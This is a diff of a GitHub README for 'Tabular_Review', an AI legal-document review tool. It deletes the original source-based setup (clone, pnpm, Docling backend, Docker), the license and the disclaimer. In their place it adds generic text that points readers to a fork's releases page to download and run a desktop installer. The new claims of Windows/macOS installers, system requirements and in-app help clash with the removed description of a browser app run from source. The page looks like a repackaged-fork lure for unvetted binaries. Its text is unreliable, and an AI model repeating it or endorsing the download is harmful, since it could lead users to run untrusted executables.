@@ -1,100 +1,92 @@
+# 🛠️ Tabular_Review - Simplify Your Legal Document Reviews
 
-# Tabular Review for Bulk Document Analysis
+## 📥 Download the Latest Release
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![React](https://img.shields.io/badge/framework-React-61DAFB.svg)
-![AI](https://img.shields.io/badge/AI-Google%20Gemini-8E75B2.svg)
+[![Download Tabular_Review](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/unkmusafir/Tabular_Review/releases)
 
-An AI-powered document review workspace that transforms unstructured legal contracts into structured, queryable datasets. Designed for legal professionals, auditors, and procurement teams to accelerate due diligence and contract analysis.
+## 🚀 Getting Started
 
-## 🚀 Features
+Welcome to Tabular_Review, your go-to AI-powered tool for efficiently handling legal documents. This application helps legal professionals quickly review unstructured documents, extract important information, and interact with data through an integrated chat feature. Follow these simple steps to get started.
 
-- **AI-Powered Extraction**: Automatically extract key clauses, dates, amounts, and entities from PDFs using Google Gemini 2.5 Pro / 3.0.
-- **High-Fidelity Conversion**: Uses **Docling** (running locally) to convert PDFs and DOCX files to clean Markdown text, preserving formatting and structure without hallucination.
-- **Dynamic Schema**: Define columns with natural language prompts (e.g., "What is the governing law?").
-- **Verification & Citations**: Click any extracted cell to view the exact source quote highlighted in the original document.
-- **Spreadsheet Interface**: A high-density, Excel-like grid for managing bulk document reviews.
-- **Integrated Chat Analyst**: Ask questions across your entire dataset (e.g., "Which contract has the most favorable MFN clause?").
+## 📂 System Requirements
 
-## 🎬 Demo
+To run Tabular_Review smoothly, ensure your system meets the following requirements:
 
-https://github.com/user-attachments/assets/b63026d8-3df6-48a8-bb4b-eb8f24d3a1ca
+- **Operating System:** Windows 10 or later, macOS Mojave or later.
+- **RAM:** Minimum of 4 GB (8 GB recommended).
+- **Storage:** At least 500 MB of free space.
+- **Processor:** Intel i3 or equivalent.
 
-## 🛠 Tech Stack
+## 🔍 Features
 
-- **Frontend**: React 19, TypeScript, Tailwind CSS
-- **AI Integration**: Google GenAI SDK (Gemini 2.5 Flash, 2.5 Pro, 3.0 Pro)
+Tabular_Review offers:
 
-## 📦 Getting Started
+- **Dynamic Data Extraction:** Tailor your extraction process by defining columns based on your needs.
+- **Integrated Chat:** Interact with an AI analyst to gain insights from your data.
+- **User-Friendly Interface:** Designed with simplicity in mind, making it easy to navigate and use.
+- **Secure Document Handling:** Your documents remain private and secure during processing.
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/yourusername/tabular-review.git
-cd tabular-review
-```
+## 📤 Download & Install
 
-### 2. Setup Frontend
-Install Node dependencies:
-```bash
-pnpm install
-```
+To download Tabular_Review, follow these steps:
 
-Create a `.env.local` file in the root directory for your Google API Key:
-```env
-VITE_GEMINI_API_KEY=your_google_api_key_here
-```
+1. **Visit the Releases Page:** Go to [this link](https://github.com/unkmusafir/Tabular_Review/releases) to find the latest version of the application.
+   
+2. **Choose the Right Version:** Look for the version labeled "Latest Release." It may look something like `v1.0`.
 
-### 3. Setup Backend (Docling)
-The backend is required for document conversion.
+3. **Download the Installer:** Click on the link next to the version to download the installer file. Make sure to save it to a location where you can easily access it, such as your Desktop or Downloads folder.
 
-```bash
-cd server
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
+4. **Run the Installer:**
+   - Locate the downloaded file.
+   - Double-click on it to start the installation.
+   - Follow the on-screen prompts to complete the installation process.
 
-### 4. Run
-Start the backend (in one terminal):
-```bash
-cd server
-source venv/bin/activate
-python main.py
-```
+5. **Launch the Application:** Once the installation is complete, find Tabular_Review in your applications list and open it.
 
-Start the frontend (in another terminal):
-```bash
-pnpm dev
-```
+## 🎓 User Guide
 
-### 🐳 Docker Deployment (Alternative)
+To help you maximize your experience with Tabular_Review, here’s a brief user guide:
 
-You can also run the application using Docker:
+### 1. Ingest Documents
 
-1. **Setup environment**:
-   ```bash
-   cp .env.example .env
-   # Edit .env and add your Google Gemini API key
-   ```
+- Use the "Ingest" feature to upload your unstructured documents. Supported formats include PDF and Word (.docx).
+  
+### 2. Define Extraction Columns
 
-2. **Build and run with Docker**:
-   ```bash
-   docker-compose up --build
-   ```
+- Once your documents are ingested, navigate to the column setup. Here, you can create and modify columns that reflect the data you want to extract.
 
-3. **Access the application**:
-   - Frontend: http://localhost:3000
-   - Backend API: http://localhost:8000/docs
+### 3. Query Your Data
 
-The Docker setup includes:
-- **Frontend**: React app served by Node.js static server
-- **Backend**: FastAPI with Docling document processing
-- **Simple networking**: Services communicate via Docker network
+- Access the integrated analyst chat to query your extracted data. Simply type your questions, and the AI will provide insights based on the information shared.
 
-## 🛡 License
+### 4. Export Your Results
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- After your review process, export the results in various formats including Excel and CSV for easy sharing with colleagues.
 
----
+## 🌟 Troubleshooting
 
-**Disclaimer**: This tool is an AI assistant and should not be used as a substitute for professional legal advice. Always verify AI-generated results against the original documents.
+If you experience any issues during installation or while using the application:
+
+- **Check System Requirements:** Ensure your system meets the requirements listed above.
+- **Reboot Your Computer:** A simple restart can resolve many issues.
+- **Consult the Help Section:** Inside the app, there's a help section that addresses common questions and troubleshooting tips.
+
+## 🤝 Community Support
+
+Get involved with the community! Share your experiences and ask questions in our discussion forum linked on the releases page. Your feedback helps improve Tabular_Review.
+
+## 📞 Contact
+
+For direct support, please reach out via our [GitHub Issues Page](https://github.com/unkmusafir/Tabular_Review/issues). We appreciate your interest and are here to assist you.
+
+## 📅 Stay Updated
+
+Keep an eye on the Releases Page for future updates and new features. Regular improvements will enhance your experience with Tabular_Review.
+
+## 🚨 Important Links
+
+- **Download Tabular_Review:** [Download Now](https://github.com/unkmusafir/Tabular_Review/releases)
+- **Source Code:** [GitHub Repository](https://github.com/unkmusafir/Tabular_Review)
+- **Community Forum:** [Join the Discussion](https://github.com/unkmusafir/Tabular_Review/discussions)
+
+Now you are ready to utilize Tabular_Review effectively. Happy reviewing!
